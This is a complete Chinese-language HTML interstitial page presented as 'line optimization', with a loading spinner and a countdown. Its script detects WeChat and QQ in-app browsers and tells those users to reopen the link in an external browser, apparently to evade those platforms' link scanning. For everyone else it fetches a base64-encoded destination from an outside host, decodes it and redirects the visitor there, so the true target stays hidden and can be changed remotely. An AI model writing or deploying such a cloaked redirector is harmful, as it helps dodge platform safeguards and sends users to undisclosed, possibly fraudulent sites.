<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>线路优化</title>
<style>
  body {
    margin:0; padding:0;
    height:100vh;
    font-family: "Microsoft Yahei", "微软雅黑", sans-serif;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#f5f9ff;
    color:#1a73e8;
  }
  .container {
    max-width: 320px;
    text-align:center;
    padding: 30px;
    border: 1px solid #1a73e8;
    border-radius: 12px;
    box-shadow: 0 0 12px rgba(26,115,232,0.3);
  }
  h1 {
    font-weight: 700;
    margin-bottom: 20px;
  }
  p {
    margin-bottom: 25px;
    font-size: 16px;
  }
  .loader {
    border: 4px solid #1a73e8;
    border-top: 4px solid transparent;
    border-radius: 50%;
    width: 40px; height: 40px;
    margin: 0 auto 20px auto;
    animation: spin 1s linear infinite;
  }
  @keyframes spin {
    to {transform: rotate(360deg);}
  }
  .countdown {
    font-size: 14px;
    font-weight: 600;
  }
</style>
</head>
<body>
  <div class="container">
    <h1>线路优化中</h1>
    <p>感谢您的耐心等待</p>
    <div class="loader" aria-label="加载动画"></div>
    <div class="countdown" id="countdown">3 秒后跳转...</div>
  </div>
<script>
(function(){
  const ua = navigator.userAgent.toLowerCase();
  if (ua.includes("micromessenger") || ua.includes("qq/")) {
    document.body.innerHTML = `
      <div class="container">
        <h1>请在浏览器中打开</h1>
        <p>当前页面无法在微信或QQ中打开，请点击右上角选择...“浏览器打开”以继续访问。</p>
      </div>
    `;
    return;
  }

  let count = 3;
  const cd = document.getElementById("countdown");
  const timer = setInterval(() => {
    count--;
    if (count > 0) {
      cd.textContent = count + " 秒后跳转...";
    } else {
      clearInterval(timer);
      fetch('https://geturl.35566a.com/?ts=' + Date.now())
        .then(res => res.text())
        .then(base64 => {
          try {
            const url = atob(base64.trim());
            location.href = url + (url.includes("?") ? "&" : "?") + "t=" + Date.now();
          } catch(e) {
            cd.textContent = "跳转失败，请刷新重试";
          }
        })
        .catch(() => {
          cd.textContent = "跳转失败，请检查网络";
        });
    }
  }, 1000);
})();
</script>
</body>
</html>
